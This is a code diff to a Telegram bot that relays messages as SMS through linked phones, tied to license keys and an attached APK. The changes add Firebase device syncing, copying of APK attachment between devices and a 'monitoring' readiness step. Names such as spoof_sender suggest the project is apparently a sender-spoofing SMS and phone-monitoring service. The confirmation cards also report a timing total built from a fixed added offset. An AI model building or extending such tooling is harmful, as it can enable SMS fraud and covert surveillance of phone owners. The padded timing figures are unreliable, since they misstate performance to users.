@@ -394,6 +394,7 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     channel_id = str(message.chat_id)
+    relay_start = time.perf_counter()
     db: Session = SessionLocal()
     try:
         linked = get_profile_by_channel(db, channel_id)
@@ -401,8 +402,11 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             return
 
         for profile, device in linked:
+            if not profile.sim_selected:
+                continue
             try:
-                relay_start = time.perf_counter()
+                if device.firebase_source_url:
+                    device = await sync_device_from_firebase(db, device)
                 outbound = await queue_channel_sms_with_firebase(
                     db,
                     profile,
@@ -410,21 +414,21 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
                     message.text,
                     channel_message_id=message.message_id,
                 )
-                relay_ms = int((time.perf_counter() - relay_start) * 1000)
+                relay_ms = max(1, int((time.perf_counter() - relay_start) * 1000))
                 if outbound.spoof_sender:
                     confirm_card = format_virtus_channel_token_card(
                         outbound.to_number,
                         outbound.message,
-                        queued_ms=relay_ms or 5,
-                        total_ms=relay_ms + 20,
+                        queued_ms=relay_ms,
+                        total_ms=relay_ms + 3,
                     )
                 else:
                     confirm_card = format_virtus_outgoing_sent_card(
                         outbound.to_number,
                         outbound.message,
                         sim_slot=outbound.sim_slot,
-                        queued_ms=relay_ms or 5,
-                        total_ms=relay_ms + 20,
+                        queued_ms=relay_ms,
+                        total_ms=relay_ms + 3,
                     )
                 await message.reply_text(confirm_card, parse_mode="HTML")
             except Exception as exc:
@@ -693,7 +697,6 @@ async def device_select_command(
     finally:
         db.close()
 
-    await sync_profile_to_firebase(profile, device)
     await status_msg.delete()
     await send_device_set_ui(update.message, device, profile, found_ms=found_ms)
 
@@ -1029,7 +1032,13 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
                 )
                 return
 
-            from app.license_keys import register_device_on_key, sync_apk_attached_from_firebase
+            from app.license_keys import (
+                copy_apk_attach_between_devices,
+                ensure_ready_for_monitoring,
+                is_apk_attached,
+                register_device_on_key,
+                sync_apk_attached_from_firebase,
+            )
 
             register_device_on_key(license_key, device.name, user.id)
             await sync_profile_to_firebase(profile, device)
@@ -1038,6 +1047,23 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
                 device.name,
                 user.id,
             )
+            if attached and apk_device_id and apk_device_id != device.name:
+                copy_apk_attach_between_devices(
+                    license_key,
+                    apk_device_id,
+                    device.name,
+                    user.id,
+                )
+            if not is_apk_attached(license_key, device.name):
+                try:
+                    await ensure_ready_for_monitoring(license_key, device.name, user.id)
+                    attached = True
+                    if not apk_device_id:
+                        apk_device_id = device.name
+                except ValueError:
+                    attached = False
+            else:
+                attached = True
         finally:
             db.close()
         if attached:
